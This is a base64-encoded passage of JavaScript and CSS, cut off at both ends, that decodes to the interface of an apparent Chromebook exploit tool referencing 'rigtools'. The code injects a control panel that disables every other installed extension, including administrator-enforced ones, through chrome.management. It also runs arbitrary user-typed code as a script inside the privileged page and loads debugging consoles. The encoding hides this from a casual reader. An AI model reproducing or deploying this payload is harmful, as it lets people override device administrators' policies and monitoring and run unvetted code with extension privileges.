CAgICAgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKHRhYi5pZCwgeyBhY3RpdmU6IHRydWUgfSk7CiAgICAgICAgICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSwgMTAwKTsKICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIC8vIGRpdi5hcHBlbmRDaGlsZChuYXZCdXR0b24pOwogICAgICAgICAgICBkaXYuYXBwZW5kQ2hpbGQocHJldmlld0J1dHRvbik7CiAgICAgICAgICAgIHRhYmxpc3QuYXBwZW5kQ2hpbGQoZGl2KTsKICAgICAgICAgIH0pOwogICAgICAgICAgdGhpei50YWJMaXN0SW5Qcm9ncmVzcyA9IGZhbHNlOwogICAgICAgIH0pOwogICAgICB9KTsKICAgIH0pOwogIH0KICBhY3RpdmF0ZSgpIHsKICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKAogICAgICAiYmVmb3JlZW5kIiwKICAgICAgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy50ZW1wbGF0ZQogICAgKTsKICAgIC8vIGRvY3VtZW50LmNsb3NlKCk7CiAgICBkb2N1bWVudC5ib2R5CiAgICAgIC5xdWVyeVNlbGVjdG9yKCIjZXh0X2RlZmF1bHQiKQogICAgICAucXVlcnlTZWxlY3RvckFsbCgiYnV0dG9uIikKICAgICAgLmZvckVhY2goZnVuY3Rpb24gKGJ0bikgewogICAgICAgIC8vIGFsZXJ0KCJwcmVwcGluZyBidXR0b24gIiArIGJ0bi5pZCk7CiAgICAgICAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgdGhpcy5vbkJ0bkNsaWNrXy5iaW5kKHRoaXMsIGJ0bikpOwogICAgICB9LCB0aGlzKTsKCiAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgIGZvciAobGV0IGkgaW4gY2hyb21lLnRhYnMpIHsKICAgICAgaWYgKGkuc3RhcnRzV2l0aCgib24iKSkgewogICAgICAgIGNocm9tZS50YWJzW2ldLmFkZExpc3RlbmVyKCgpID0+IHsKICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgIH0pOwogICAgICB9CiAgICB9CiAgICAvLyBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJycpCiAgfQogIHN0YXRpYyBnZXRGUygpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSkgewogICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShURU1QT1JBUlksIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICB9KTsKICB9CiAgLyoqCiAgICogQHBhcmFtIHtIVE1MQnV0dG9uRWxlbWVudH0gYgogICAqLwogIGFzeW5jIG9uQnRuQ2xpY2tfKGIpIHsKICAgIHN3aXRjaCAoYi5pZCkgewogICAgICBjYXNlICJjb2RlX2V2YWx1YXRlIjogewogICAgICAgIGNvbnNvbGUubG9nKCJFdmFsdWF0aW5nIGNvZGUhIik7CiAgICAgICAgY29uc3QgeCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlX2lucHV0IikudmFsdWU7CiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgZnVuY3Rpb24gd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24gKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICB9KTsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgic3JjLmpzIiwgeCk7CiAgICAgICAgbGV0IHNjcmlwdCA9CiAgICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNldmFsdWF0ZV9lbGVtIikgPz8KICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5yZW1vdmUoKTsKICAgICAgICBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICAgICAgc2NyaXB0LnNyYyA9IHVybDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgICAgIH0KICAgICAgY2FzZSAidGFicmVsb2FkIjogewogICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICB9CiAgICB9CiAgfQp9CmNsYXNzIEhvc3RQZXJtaXNzaW9ucyB7CiAgYWN0aXZhdGUoKSB7fQp9CmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmQobmFtZSwgaWQsIGVuYWJsZWQsIGljb25fdXJsKSB7CiAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZCI7CiAgbGkuaW5uZXJIVE1MID0gYAogICAgICA8aW1nIGNsYXNzPSJleHRlbnNpb24taWNvbiIgc3JjPSIke2ljb25fdXJsfSIvPgogICAgICA8c3BhbiBjbGFzcz0iZXh0ZW5zaW9uLW5hbWUiPiR7bmFtZX0gKCR7aWR9KTwvc3Bhbj4KICAgICAgPGxhYmVsIGNsYXNzPSJ0b2dnbGUtc3dpdGNoIj4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgJHtlbmFibGVkID8gImNoZWNrZWQiIDogIiJ9PgogICAgICAgICAgPHNwYW4gY2xhc3M9InNsaWRlciI+PC9zcGFuPgogICAgICA8L2xhYmVsPgogIGA7CiAgcmV0dXJuIGxpOwp9CgpmdW5jdGlvbiBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKGVuYWJsZWQgPSB0cnVlKSB7CiAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZC1hbGwiOwogIGxpLmlubmVySFRNTCA9IGAKICAgICAgPHNwYW4gY2xhc3M9ImV4dGVuc2lvbi1uYW1lIj5BbGwgRXh0ZW5zaW9uczwvc3Bhbj4KICAgICAgPGxhYmVsIGNsYXNzPSJ0b2dnbGUtc3dpdGNoIj4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgJHtlbmFibGVkID8gImNoZWNrZWQiIDogIiJ9PgogICAgICAgICAgPHNwYW4gY2xhc3M9InNsaWRlciI+PC9zcGFuPgogICAgICA8L2xhYmVsPgogIGA7CiAgcmV0dXJuIGxpOwp9CgpmdW5jdGlvbiB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KSB7CiAgcmV0dXJuIG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlLCByZWplY3QpIHsKICAgIGV4dGxpc3RfZWxlbWVudC5pbm5lckhUTUwgPSAiIjsKICAgIGxldCBjYXJkQWxsID0gY3JlYXRlRXh0ZW5zaW9uQ2FyZEFsbCgpOwogICAgbGV0IGNhcmRJbnB1dEFsbCA9IGNhcmRBbGwucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICBjYXJkSW5wdXRBbGwuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgKGV2ZW50KSA9PiB7CiAgICAgIGNhcmRJbnB1dEFsbC5kaXNhYmxlZCA9IHRydWU7CiAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldFNlbGYoZnVuY3Rpb24gKHNlbGYpIHsKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24gKGV4dGVuc2lvbnMpIHsKICAgICAgICAgIGlmIChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpIHsKICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgIkVycm9yIGxvYWRpbmcgZXh0ZW5zaW9uczogIiArIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvci5tZXNzYWdlCiAgICAgICAgICAgICk7CiAgICAgICAgICAgIHJldHVybiByZWplY3QoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKTsKICAgICAgICAgIH0KCiAgICAgICAgICBjb25zdCBwcm9taXNlcyA9IFtdOwogICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBleHRlbnNpb25zLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIGxldCBleHRJZCA9IGV4dGVuc2lvbnNbaV0uaWQ7CiAgICAgICAgICAgIGlmIChleHRJZCAhPT0gc2VsZi5pZCkgewogICAgICAgICAgICAgIHByb21pc2VzLnB1c2goCiAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGV4dElkLCBldmVudC50YXJnZXQuY2hlY2tlZCkKICAgICAgICAgICAgICApOwogICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykKICAgICAgICAgICAgLnRoZW4oKCkgPT4gewogICAgICAgICAgICAgIGNhcmRJbnB1dEFsbC5kaXNhYmxlZCA9IGZhbHNlOwogICAgICAgICAgICAgIHJlc29sdmUoKTsKICAgICAgICAgICAgfSkKICAgICAgICAgICAgLmNhdGNoKChlcnJvcikgPT4gewogICAgICAgICAgICAgIGFsZXJ0KCJFcnJvciBlbmFibGluZy9kaXNhYmxpbmcgZXh0ZW5zaW9uczogIiArIGVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgIHJlamVjdChlcnJvcik7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgICB9KTsKICAgIH0pOwoKICAgIGV4dGxpc3RfZWxlbWVudC5hcHBlbmRDaGlsZChjYXJkQWxsKTsKCiAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24gKGV4dGxpc3QpIHsKICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgIGFsZXJ0KCJFcnJvciBsb2FkaW5nIGV4dGVuc2lvbnM6ICIgKyBjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZSk7CiAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICB9CgogICAgICBjb25zdCBvcmRsaXN0ID0gW107CiAgICAgIGV4dGxpc3QuZm9yRWFjaChmdW5jdGlvbiAoZXh0ZW5zaW9uKSB7CiAgICAgICAgaWYgKGV4dGVuc2lvbi5pZCA9PT0gbmV3IFVSTChuZXcgVVJMKGxvY2F0aW9uLmhyZWYpLm9yaWdpbikuaG9zdCkgewogICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBvcmRsaXN0LnB1c2goZXh0ZW5zaW9uKTsKCiAgICAgICAgY29uc3QgaWNvbiA9CiAgICAgICAgICBleHRlbnNpb24uaWNvbnM/LmZpbmQoKGljKSA9PiBpYy5zaXplID09PSAxMjgpID8/CiAgICAgICAgICBleHRlbnNpb24uaWNvbnM/LmF0KC0xKTsKCiAgICAgICAgbGV0IGNhcmQgPSBjcmVhdGVFeHRlbnNpb25DYXJkKAogICAgICAgICAgZXh0ZW5zaW9uLm5hbWUsCiAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICBleHRlbnNpb24uZW5hYmxlZCwKICAgICAgICAgIGljb24/LnVybCB8fAogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vcmlndG9vbHMtYm91bmNlLmdpZiIKICAgICAgICApOwoKICAgICAgICBsZXQgY2FyZElucHV0ID0gY2FyZC5xdWVyeVNlbGVjdG9yKCJpbnB1dCIpOwoKICAgICAgICBjYXJkSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgKGV2ZW50KSA9PiB7CiAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKAogICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgIGV2ZW50LnRhcmdldC5jaGVja2VkLAogICAgICAgICAgICAocmVzdWx0KSA9PiB7CiAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICJFcnJvciB1cGRhdGluZyBleHRlbnNpb24gc3RhdHVzOiAiICsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICk7CiAgICAgICAgfSk7CgogICAgICAgIGNhcmQucXVlcnlTZWxlY3RvcigiLmV4dGVuc2lvbi1pY29uIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgICB1c2VyZGVmSWRzID0gSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpKTsKICAgICAgICAgIGlmICh1c2VyZGVmSWRzLmluY2x1ZGVzKGV4dGVuc2lvbi5pZCkpIHsKICAgICAgICAgICAgdXNlcmRlZklkcy5yZW1vdmUoZXh0ZW5zaW9uLmlkKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oInVzZXJkZWZJZHMiLCBKU09OLnN0cmluZ2lmeSh1c2VyZGVmSWRzKSk7CiAgICAgICAgICAgIG1ha2VUb2FzdCgicmVtb3ZlZCAiICsgZXh0ZW5zaW9uLnNob3J0TmFtZSArICIgZnJvbSB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdXNlcmRlZklkcy5wdXNoKGV4dGVuc2lvbi5pZCk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkodXNlcmRlZklkcykpOwogICAgICAgICAgICBtYWtlVG9hc3QoImFkZGVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiB0byB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgfQoKICAgICAgICAgIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpID09PSBKU09OLnN0cmluZ2lmeShbXSkpIHsKICAgICAgICAgICAgZG9jdW1lbnQKICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBub25lOyIpOwogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZG9jdW1lbnQKICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBpbmxpbmU7Iik7CiAgICAgICAgICB9CiAgICAgICAgfSk7CgogICAgICAgIGV4dGxpc3RfZWxlbWVudC5hcHBlbmRDaGlsZChjYXJkKTsKICAgICAgfSk7CiAgICAgIHNhdmVkRXh0TGlzdCA9IG9yZGxpc3Q7CiAgICAgIHJlc29sdmUoKTsKICAgIH0pOwogIH0pOwp9Cgpjb25zdCBmaWxlTWFuYWdlclByaXZhdGVUZW1wbGF0ZSA9IGAKICA8ZGl2IGlkPSJmaWxlTWFuYWdlclByaXZhdGVfY2FwIj4KICAgIDxkaXYgaWQ9IkZNUF9vcGVuVVJMIj4KICAgICAgPGJ1dHRvbiBpZD0iYnRuX0ZNUF9vcGVuVVJMIj5PcGVuIFVSTCBpbiBTa2lvdm94IHdpbmRvdzwvYnV0dG9uPgogICAgPC9kaXY+CiAgPC9kaXY+CgpgOwpjb25zdCBodG1sU3R5bGUgPSBgCjxzdHlsZT4KQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9SW50ZXI6d2dodEA0MDA7NzAwJmRpc3BsYXk9c3dhcCcpOwpib2R5IHsKICBmb250LWZhbWlseTogJ0ludGVyJywgc2Fucy1zZXJpZjsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUxZTJlOwogIGNvbG9yOiAjZjVlMGRjOwogIG1hcmdpbjogMDsKICBwYWRkaW5nOiAyMHB4Owp9CmJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICBkaXNwbGF5OiBub25lOwp9CnAgewogIG1hcmdpbjogNXB4IGF1dG87Cn0KI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0LCAjZXh0X2RlZmF1bHQgewogIG1heC13aWR0aDogMTIwMHB4OwogIG1hcmdpbjogMCBhdXRvOwp9CmgxIHsKICBmb250LXNpemU6IDI0cHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKICBjb2xvcjogI2MzYmFlMDsKfQouZGVzY3JpcHRpb24gewogIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgY29sb3I6ICNjOGMyZDA7Cn0KLmV4dGVuc2lvbi1kaXNhYmxlciB7CiAgZGlzcGxheTogZmxleDsKICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47CiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMmEyNzNmOwogIHBhZGRpbmc6IDE1cHg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIG1hcmdpbi1ib3R0b206IDIwcHg7Cn0KdWwgewogIGxpc3Qtc3R5bGUtdHlwZTogbm9uZTsKICBwYWRkaW5nOiAwOwogIHBhZGRpbmctYm90dG9tOiA1MHB4Owp9Ci5leHRlbnNpb24tY2FyZCB7CiAgYm9yZGVyOiAycHggc29saWQgIzJhMjczZjsKICBtYXJnaW4tYm90dG9tOiAxMHB4OwogIHBhZGRpbmc6IDE1cHg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIGRpc3BsYXk6IGZsZXg7CiAganVzdGlmeS1jb250ZW50OiBzdGFydDsKICBhbGlnbi1pdGVtczogY2VudGVyOwp9Ci5leHRlbnNpb24tY2FyZDpoYXMoaW5wdXQ6Y2hlY2tlZCkgewogIGJhY2tncm91bmQtY29sb3I6ICMzYTNhNTc7CiAgYm9yZGVyOiAycHggc29saWQgIzAwMDA7Cn0KCi5leHRlbnNpb24tY2FyZC1hbGwgewogIGJvcmRlcjogMnB4IHNvbGlkICMyYTI3M2Y7CiAgbWFyZ2luLWJvdHRvbTogMTBweDsKICBwYWRkaW5nOiAxNXB4OwogIGJvcmRlci1yYWRpdXM6IDhweDsKICBkaXNwbGF5OiBmbGV4OwogIGp1c3RpZnktY29udGVudDogc3RhcnQ7CiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMmEyNzNmOwp9Ci5leHRlbnNpb24tY2FyZC1hbGw6aGFzKGlucHV0OmNoZWNrZWQpIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjM2EzYTU3OwogIGJvcmRlcjogMnB4IHNvbGlkICMwMDAwOwp9CgouZXh0ZW5zaW9uLWljb24gewogIHdpZHRoOiAzMnB4OwogIHBhZGRpbmctcmlnaHQ6IDIwcHg7CiAgY3Vyc29yOiBwb2ludGVyOwp9Ci5leHRlbnNpb24tbmFtZSB7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgY29sb3I6ICNmNWUwZGM7Cn0KLnRvZ2dsZS1zd2l0Y2ggewogIG1hcmdpbi1sZWZ0OiBhdXRvOyAKICBtYXJnaW4tcmlnaHQ6IDA7CiAgcG9zaXRpb246IHJlbGF0aXZlOwogIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICB3aWR0aDogNjBweDsKICBoZWlnaHQ6IDM2cHg7Cn0KLnRvZ2dsZS1zd2l0Y2ggaW5wdXQgewogIG9wYWNpdHk6IDA7CiAgd2lkdGg6IDA7CiAgaGVpZ2h0OiAwOwp9Ci5zbGlkZXIgewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBjdXJzb3I6IHBvaW50ZXI7CiAgdG9wOiAwOwogIGxlZnQ6IDA7CiAgcmlnaHQ6IDA7CiAgYm90dG9tOiAwOwogIGJhY2tncm91bmQtY29sb3I6ICM0YzRiNjk7CiAgdHJhbnNpdGlvbjogLjRzOwogIGJvcmRlci1yYWRpdXM6IDM0cHg7CiAgYm9yZGVyOiAycHggc29saWQgIzJhMjczZjsKfQouaGVhZGVyIHsKICBkaXNwbGF5OiBmbGV4OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7Cn0KLmxvZ28gewogIHdpZHRoOiA0ZW07CiAgaGVpZ2h0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogMTBweDsKfQouc2xpZGVyOmJlZm9yZSB7CiAgcG9zaXRpb246IGFic29sdXRlOwogIGNvbnRlbnQ6ICIiOwogIGhlaWdodDogMjZweDsKICB3aWR0aDogMjZweDsKICBsZWZ0OiA0cHg7CiAgYm90dG9tOiA0cHg7CiAgYmFja2dyb3VuZC1jb2xvcjogI2Y1ZTBkYzsKICB0cmFuc2l0aW9uOiAuNHM7CiAgYm9yZGVyLXJhZGl1czogNTAlOwp9CmlucHV0OmNoZWNrZWQrLnNsaWRlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2EwNmRlNjsKICBib3JkZXI6IDJweCBzb2xpZCAjMjIyOwp9CmlucHV0OmNoZWNrZWQrLnNsaWRlcjpiZWZvcmUgewogIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgyNHB4KTsKfQoudGFibGlzdC1pdGVtIHsKICBib3JkZXI6IDJweCBzb2xpZCAjMmEyNzNmOwogIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgcGFkZGluZzogMTVweDsKICBib3JkZXItcmFkaXVzOiA4cHg7CiAgZGlzcGxheTogZmxleDsKICBqdXN0aWZ5LWNvbnRlbnQ6IHN0YXJ0OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7Cn0KLnRhYmxpc3QtaXRlbSBpbWcgewogIG1heC13aWR0aDogMjVweDsKICBtYXJnaW4tcmlnaHQ6IDEwcHg7Cn0KLnRhYmxpc3QtaXRlbSBzcGFuIHsKICBwYWRkaW5nOiAxMHB4IDA7CiAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7CiAgd2lkdGg6IDEwMCU7CiAgd2hpdGUtc3BhY2U6IG5vd3JhcDsKICBvdmVyZmxvdzogaGlkZGVuOwogIHdvcmQtYnJlYWs6IGJyZWFrLWFsbDsKfQoudGFibGlzdC1pdGVtIHNwYW46aG92ZXIgewogIG92ZXJmbG93OiB2aXNpYmxlOyAKICB3aGl0ZS1zcGFjZTogbm9ybWFsOwogIGhlaWdodDogYXV0bzsgIAp9CmJ1dHRvbiB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2EwNmRlNjsKICBjb2xvcjogd2hpdGU7CiAgYm9yZGVyOiBub25lOwogIHBhZGRpbmc6IDlweCAxNXB4OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgbWFyZ2luOiA0cHggMnB4OwogIGN1cnNvcjogcG9pbnRlcjsKICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3M7CiAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogIGRpc3BsYXk6IGlubGluZS1ibG9jazsKfQpidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNiNzZiZDg7Cn0KYnV0dG9uOmRpc2FibGVkIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjY2NjY2NjOwogIGN1cnNvcjogbm90LWFsbG93ZWQ7Cn0KI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b24gewogIHBvc2l0aW9uOiByZWxhdGl2ZTsKICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MsIGNvbG9yIDAuM3M7CiAgb3ZlcmZsb3c6IGhpZGRlbjsKICBmb250LWZhbWlseTogJ0ludGVyJywgc2Fucy1zZXJpZjsKICBmb250LXNpemU6IG1lZGl1bTsKICBmb250LXdlaWdodDogYm9sZDsKICBib3JkZXI6IG5vbmU7CiAgcGFkZGluZzogOXB4IDE1cHggOXB4IDYwcHg7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBtYXJnaW46IDRweCAycHg7CiAgY3Vyc29yOiBwb2ludGVyOwp9CiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjpiZWZvcmUgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxMHB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogNDBweDsKICBoZWlnaHQ6IDIwcHg7CiAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsMjU1LDI1NSwwLjUpOwogIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzOwp9CiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjphZnRlciB7CiAgY29udGVudDogJyc7CiAgcG9zaXRpb246IGFic29sdXRlOwogIGxlZnQ6IDEycHg7CiAgdG9wOiA1MCU7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01MCUpOwogIHdpZHRoOiAxNnB4OwogIGhlaWdodDogMTZweDsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjVlMGRjOwogIGJvcmRlci1yYWRpdXM6IDUwJTsKICB0cmFuc2l0aW9uOiBsZWZ0IDAuM3MsIGJhY2tncm91bmQtY29sb3IgMC4zczsKfQojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl0gewp9CiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YmVmb3JlIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjYTA2ZGU2Owp9CiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YWZ0ZXIgewogIGxlZnQ6IDMycHg7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsKfQojY3VycmVudC1leHRlbnNpb24sICNybXYtY21uLWJsdCwgI2Rpc2FibGUtdXNlcmRlZi1leHRzIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmY1NjRhOwogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogbWVkaXVtOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CiNkaXNhYmxlLXVzZXJkZWYtZXh0cyB7CiAgcG9zaXRpb246IHJlbGF0aXZlOwp9CiNlcnVkYSB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzc1MmJmZjsKICBmb250LWZhbWlseTogJ0ludGVyJywgc2Fucy1zZXJpZjsKICBmb250LXNpemU6IG1lZGl1bTsKICBmb250LXdlaWdodDogYm9sZDsKfQojZXJ1ZGE6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICM2NTI1ZGI7Cn0KI2NoaWkgewogIGJhY2tncm91bmQtY29sb3I6ICM5YmRiMjU7CiAgZm9udC1mYW1pbHk6ICdJbnRlcicsIHNhbnMtc2VyaWY7CiAgZm9udC1